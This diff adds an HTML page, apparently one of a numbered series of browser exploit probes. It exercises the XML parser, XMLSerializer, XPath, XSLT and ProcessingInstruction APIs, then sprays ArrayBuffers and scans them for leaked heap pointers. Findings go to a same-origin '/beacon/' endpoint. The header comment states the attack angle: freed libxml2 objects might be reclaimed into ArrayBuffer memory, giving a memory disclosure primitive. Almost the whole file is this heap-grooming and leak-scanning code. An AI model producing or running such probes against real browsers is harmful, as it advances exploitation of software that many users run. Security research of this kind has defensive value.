@@ -1,0 +1,473 @@
+<!--
+  p800: DOMParser XML / XMLSerializer / XPathEvaluator / XSLTProcessor /
+        XMLDocument / ProcessingInstruction residue
+
+  DOMParser XML mode: parsing XML creates C++ libxml2 node trees
+  in a separate allocator from the HTML DOM. Complex XML with
+  namespaces, CDATA, processing instructions, and entity references
+  exercises the libxml2 parser state machine. The parser allocates
+  xmlDoc, xmlNode, xmlNs, xmlAttr structs from its own pool.
+
+  XMLSerializer: serializing DOM trees back to XML creates C++
+  serialization buffers and namespace prefix maps. Complex trees
+  with mixed namespaces exercise the prefix resolution allocator.
+
+  XPathEvaluator: evaluating XPath expressions creates C++ libxml2
+  xpath context, compiled expression, and result objects. Complex
+  expressions (predicates, functions, axes) allocate from the
+  xpath evaluator pool.
+
+  XSLTProcessor: importStylesheet + transformToDocument/Fragment
+  creates C++ libxslt transformation context, template match
+  tables, and output trees. Even simple transforms allocate from
+  the XSLT allocator.
+
+  ProcessingInstruction: PI nodes in XML (<?target data?>) allocate
+  C++ ProcessingInstruction objects with target/data strings.
+
+  XMLDocument: creating documents via createDocument with namespace
+  exercises the namespace-aware document allocator.
+
+  Attack angle: libxml2/libxslt use their own malloc wrappers
+  (xmlMalloc/xmlFree) which MAY be configured to use the system
+  allocator rather than bmalloc. If so, freed libxml2 objects
+  could land in ArrayBuffer's pool.
+
+  A) DOMParser XML with complex namespace trees.
+  B) XMLSerializer with namespace prefix resolution.
+  C) XPathEvaluator complex expression compilation.
+  D) XSLTProcessor transform lifecycle.
+  E) ProcessingInstruction create/remove churn.
+  F) document.implementation.createDocument namespace churn.
+
+  CRASH_CLASS: LOW (XML parsing, no side effects)
+  prior art: p783 (DOMParser HTML mode)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p800</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+function hex64(dv,off){
+  var lo=dv.getUint32(off,true),hi=dv.getUint32(off+4,true);
+  var hs=hi.toString(16),ls=lo.toString(16);
+  while(ls.length<8)ls='0'+ls;
+  return '0x'+hs+ls;
+}
+function isPtr(dv,off){
+  var hi=dv.getUint32(off+4,true);
+  return hi!==0 && hi!==0xFFFFFFFF && (hi>>>0)<0x80000000 && hi>0x100;
+}
+function sprayAndScan(tag,round,sizes){
+  var hits=0;
+  for(var si=0;si<sizes.length;si++){
+    var sz=sizes[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz);
+      var dv=new DataView(ab);
+      for(var off=0;off+8<=sz;off+=8){
+        if(isPtr(dv,off)){
+          hits++;
+          if(hits<=2)b(tag+'-PTR round='+round+' sz='+sz+' i='+i+' off='+off+' val='+hex64(dv,off));
+        }
+      }
+    }
+  }
+  return hits;
+}
+
+window.onload=function(){
+b('p800-START');
+
+// === Section A: DOMParser XML with complex namespace trees ===
+try{
+  b('A-xml-parse');
+  var aHits=0;
+
+  var parser=new DOMParser();
+
+  for(var round=0;round<5;round++){
+    (function(){
+      for(var i=0;i<25;i++){
+        // Build complex XML with namespaces, CDATA, PIs, comments
+        var xml='<?xml version="1.0" encoding="UTF-8"?>\n';
+        xml+='<?app-config mode="test" version="'+i+'"?>\n';
+        xml+='<root xmlns="http://example.com/ns'+i+'" ';
+        xml+='xmlns:a="http://example.com/a'+i+'" ';
+        xml+='xmlns:b="http://example.com/b'+i+'" ';
+        xml+='xmlns:c="http://example.com/c'+i+'">\n';
+
+        for(var j=0;j<15;j++){
+          xml+='  <a:element'+j+' b:attr="val'+j+'" c:data="'+j*100+'">\n';
+          xml+='    <b:child xmlns:d="http://example.com/d'+j+'">\n';
+          xml+='      <d:nested>Text content '+i+'_'+j+'</d:nested>\n';
+          xml+='      <![CDATA[Raw data block <with> special & chars "quotes" '+j+']]>\n';
+          xml+='      <?processing-instruction data-'+j+'?>\n';
+          xml+='      <!-- Comment node '+j+' -->\n';
+          xml+='      <c:deep a:ref="ref_'+j+'">\n';
+          xml+='        <a:leaf>Leaf '+j+'</a:leaf>\n';
+          xml+='      </c:deep>\n';
+          xml+='    </b:child>\n';
+          xml+='  </a:element'+j+'>\n';
+        }
+
+        xml+='</root>';
+
+        try{
+          var doc=parser.parseFromString(xml,'text/xml');
+
+          if(round===0&&i===0){
+            b('A parsed: root='+doc.documentElement.nodeName+' children='+doc.documentElement.childNodes.length);
+            b('A ns='+doc.documentElement.namespaceURI);
+          }
+
+          // Walk the tree to ensure all nodes are materialized
+          var walker=doc.createTreeWalker(doc.documentElement,0xFFFFFFFF);
+          var nodeCount=0;
+          while(walker.nextNode())nodeCount++;
+
+          if(round===0&&i===0)b('A nodeCount='+nodeCount);
+
+          // Null out reference
+          doc=null;
+        }catch(e){
+          if(i===0&&round===0)b('A parse_err='+e.message);
+        }
+      }
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    aHits+=sprayAndScan('A',round,[32,48,64,96,128]);
+  }
+  b('A-DONE hits='+aHits);
+}catch(e){b('A-ERR '+e.message);}
+
+// === Section B: XMLSerializer with namespace prefix resolution ===
+try{
+  b('B-xmlserializer');
+  var bHits=0;
+  var serializer=new XMLSerializer();
+
+  for(var round=0;round<5;round++){
+    (function(){
+      for(var i=0;i<30;i++){
+        // Create document with complex namespace structure
+        try{
+          var doc=document.implementation.createDocument(
+            'http://example.com/ns'+i,'root',null);
+          var root=doc.documentElement;
+
+          // Add namespaced elements
+          for(var j=0;j<10;j++){
+            var ns='http://example.com/child'+j;
+            var el=doc.createElementNS(ns,'c'+j+':element'+j);
+            el.setAttributeNS('http://example.com/attr'+j,'a'+j+':data','value_'+i+'_'+j);
+
+            var text=doc.createTextNode('Content '+i+'_'+j);
+            el.appendChild(text);
+
+            var comment=doc.createComment('Comment '+j);
+            el.appendChild(comment);
+
+            var cdata=doc.createCDATASection('CDATA block '+j);
+            el.appendChild(cdata);
+
+            root.appendChild(el);
+          }
+
+          // Serialize to string
+          var str=serializer.serializeToString(doc);
+
+          if(round===0&&i===0){
+            b('B serialized length='+str.length);
+            b('B first 100='+str.substring(0,100));
+          }
+
+          // Re-parse the serialized output
+          var parser2=new DOMParser();
+          var reparsed=parser2.parseFromString(str,'text/xml');
+
+          doc=null;reparsed=null;
+        }catch(e){
+          if(i===0&&round===0)b('B serial_err='+e.message);
+        }
+      }
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    bHits+=sprayAndScan('B',round,[32,48,64,96,128]);
+  }
+  b('B-DONE hits='+bHits);
+}catch(e){b('B-ERR '+e.message);}
+
+// === Section C: XPathEvaluator complex expression compilation ===
+try{
+  b('C-xpath');
+  var cHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      // Create XML document to query
+      var parser3=new DOMParser();
+      var xml='<library>';
+      for(var i=0;i<20;i++){
+        xml+='<book id="b'+i+'" category="'+(i%3===0?'fiction':i%3===1?'science':'history')+'">';
+        xml+='<title>Book '+i+'</title><author>Author '+(i%5)+'</author>';
+        xml+='<price>'+(10+i*2.5)+'</price><year>'+(2000+i)+'</year>';
+        xml+='<chapters>';
+        for(var c=0;c<5;c++)xml+='<chapter num="'+(c+1)+'">Chapter '+(c+1)+' of book '+i+'</chapter>';
+        xml+='</chapters></book>';
+      }
+      xml+='</library>';
+      var doc=parser3.parseFromString(xml,'text/xml');
+
+      var expressions=[
+        '//book',
+        '//book[@category="fiction"]',
+        '//book[price > 30]',
+        '//book/title/text()',
+        '//book[position() <= 5]',
+        '//book[last()]',
+        'count(//book)',
+        'sum(//book/price)',
+        '//book[contains(title, "Book 1")]',
+        '//book[starts-with(@id, "b1")]',
+        '//book/chapters/chapter[@num > 3]',
+        '//book[@category="science"]/author',
+        '//book[year >= 2010 and year <= 2015]',
+        '//book[not(@category="fiction")]',
+        'string-length(//book[1]/title)',
+        'concat(//book[1]/title, " by ", //book[1]/author)',
+        '//book/ancestor::library',
+        '//chapter/parent::chapters/parent::book/@id',
+        '//book[price = //book[1]/price]',
+        '//book[following-sibling::book]'
+      ];
+
+      var evaluator;
+      try{evaluator=new XPathEvaluator();}catch(e){}
+
+      for(var ei=0;ei<expressions.length;ei++){
+        for(var rep=0;rep<3;rep++){
+          try{
+            var result;
+            if(evaluator){
+              var expr=evaluator.createExpression(expressions[ei],null);
+              result=expr.evaluate(doc,XPathResult.ANY_TYPE,null);
+            }else{
+              result=doc.evaluate(expressions[ei],doc,null,XPathResult.ANY_TYPE,null);
+            }
+
+            if(round===0&&ei<3&&rep===0){
+              b('C xpath['+ei+']=type:'+result.resultType);
+              if(result.resultType===1)b('C  number='+result.numberValue);
+              if(result.resultType===2)b('C  string='+result.stringValue.substring(0,50));
+            }
+
+            // Iterate results
+            if(result.resultType===4||result.resultType===5){
+              var node;
+              var count=0;
+              while((node=result.iterateNext())!==null)count++;
+              if(round===0&&ei<3&&rep===0)b('C  nodes='+count);
+            }
+          }catch(e){
+            if(ei===0&&rep===0&&round===0)b('C xpath_err='+e.message);
+          }
+        }
+      }
+
+      doc=null;
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    cHits+=sprayAndScan('C',round,[32,48,64,96,128]);
+  }
+  b('C-DONE hits='+cHits);
+}catch(e){b('C-ERR '+e.message);}
+
+// === Section D: XSLTProcessor transform lifecycle ===
+try{
+  b('D-xslt');
+  var dHits=0;
+
+  var xsltSupported=typeof XSLTProcessor!=='undefined';
+  if(!xsltSupported){
+    b('D-SKIP no XSLTProcessor');
+  }else{
+    for(var round=0;round<5;round++){
+      (function(){
+        var parser4=new DOMParser();
+
+        for(var i=0;i<15;i++){
+          try{
+            // Create XSLT stylesheet
+            var xslt='<?xml version="1.0"?>\n';
+            xslt+='<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">\n';
+            xslt+='  <xsl:output method="html"/>\n';
+            xslt+='  <xsl:template match="/">\n';
+            xslt+='    <div class="result">\n';
+            xslt+='      <xsl:for-each select="//item">\n';
+            xslt+='        <p><xsl:value-of select="@name"/>: <xsl:value-of select="."/></p>\n';
+            xslt+='      </xsl:for-each>\n';
+            xslt+='      <span>Count: <xsl:value-of select="count(//item)"/></span>\n';
+            xslt+='    </div>\n';
+            xslt+='  </xsl:template>\n';
+            xslt+='</xsl:stylesheet>';
+
+            var xsltDoc=parser4.parseFromString(xslt,'text/xml');
+
+            // Create source XML
+            var src='<data>';
+            for(var j=0;j<20;j++){
+              src+='<item name="item'+j+'" id="'+j+'">Value '+(i*20+j)+'</item>';
+            }
+            src+='</data>';
+            var srcDoc=parser4.parseFromString(src,'text/xml');
+
+            // Transform
+            var proc=new XSLTProcessor();
+            proc.importStylesheet(xsltDoc);
+
+            // transformToDocument
+            var resultDoc=proc.transformToDocument(srcDoc);
+            if(round===0&&i===0&&resultDoc){
+              b('D transformToDocument root='+resultDoc.documentElement.nodeName);
+              b('D childNodes='+resultDoc.documentElement.childNodes.length);
+            }
+
+            // transformToFragment
+            var frag=proc.transformToFragment(srcDoc,document);
+            if(round===0&&i===0&&frag){
+              b('D transformToFragment childNodes='+frag.childNodes.length);
+            }
+
+            // Set/remove parameters
+            proc.setParameter(null,'testParam','value_'+i);
+            proc.removeParameter(null,'testParam');
+            proc.clearParameters();
+
+            proc.reset();
+
+            resultDoc=null;frag=null;proc=null;
+          }catch(e){
+            if(i===0&&round===0)b('D xslt_err='+e.message);
+          }
+        }
+      })();
+
+      for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+      dHits+=sprayAndScan('D',round,[48,64,96,128,192]);
+    }
+  }
+  b('D-DONE hits='+dHits);
+}catch(e){b('D-ERR '+e.message);}
+
+// === Section E: ProcessingInstruction create/remove churn ===
+try{
+  b('E-pi');
+  var eHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var piCount=0;
+
+      for(var d=0;d<10;d++){
+        try{
+          var doc=document.implementation.createDocument(null,'root',null);
+          var root=doc.documentElement;
+
+          // Create many processing instructions
+          for(var i=0;i<30;i++){
+            var pi=doc.createProcessingInstruction(
+              'target'+i,
+              'data="value_'+d+'_'+i+'" mode="test" encoding="utf-8" version="1.'+i+'"'
+            );
+            root.appendChild(pi);
+            piCount++;
+          }
+
+          if(round===0&&d===0){
+            b('E created '+root.childNodes.length+' PI nodes');
+            var firstPI=root.firstChild;
+            if(firstPI)b('E PI target='+firstPI.target+' data='+firstPI.data.substring(0,40));
+          }
+
+          // Remove all PIs
+          while(root.firstChild){
+            root.removeChild(root.firstChild);
+          }
+
+          doc=null;
+        }catch(e){
+          if(d===0&&round===0)b('E pi_err='+e.message);
+        }
+      }
+
+      if(round===0)b('E created/removed '+piCount+' ProcessingInstruction nodes');
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    eHits+=sprayAndScan('E',round,[32,48,64,96]);
+  }
+  b('E-DONE hits='+eHits);
+}catch(e){b('E-ERR '+e.message);}
+
+// === Section F: createDocument namespace churn ===
+try{
+  b('F-createdocument');
+  var fHits=0;
+
+  for(var round=0;round<5;round++){
+    (function(){
+      var docCount=0;
+
+      for(var i=0;i<40;i++){
+        try{
+          // Create documents with various namespaces
+          var ns='http://example.com/test/namespace/'+round+'/'+i;
+          var qualifiedName='ns'+i+':root'+i;
+
+          var doc=document.implementation.createDocument(ns,qualifiedName,null);
+          var root=doc.documentElement;
+
+          // Add namespaced children
+          for(var j=0;j<8;j++){
+            var childNs='http://example.com/child/'+j;
+            var child=doc.createElementNS(childNs,'c'+j+':elem');
+            child.setAttributeNS(ns,'ns'+i+':attr','val');
+            child.setAttributeNS(childNs,'c'+j+':local','data_'+j);
+            child.appendChild(doc.createTextNode('Text '+j));
+            root.appendChild(child);
+          }
+
+          if(round===0&&i===0){
+            b('F doc ns='+root.namespaceURI);
+            b('F doc name='+root.nodeName+' children='+root.childNodes.length);
+          }
+
+          // Clone the document
+          try{
+            var clone=root.cloneNode(true);
+            if(round===0&&i===0)b('F clone children='+clone.childNodes.length);
+          }catch(e){}
+
+          doc=null;
+          docCount++;
+        }catch(e){
+          if(i===0&&round===0)b('F doc_err='+e.message);
+        }
+      }
+
+      if(round===0)b('F created '+docCount+' namespace documents with children');
+    })();
+
+    for(var i=0;i<3000;i++){var tmp=new ArrayBuffer(64);}
+    fHits+=sprayAndScan('F',round,[32,48,64,96,128]);
+  }
+  b('F-DONE hits='+fHits);
+}catch(e){b('F-ERR '+e.message);}
+
+b('p800-COMPLETE');
+};
+</script>
+</head>
+<body></body></html>
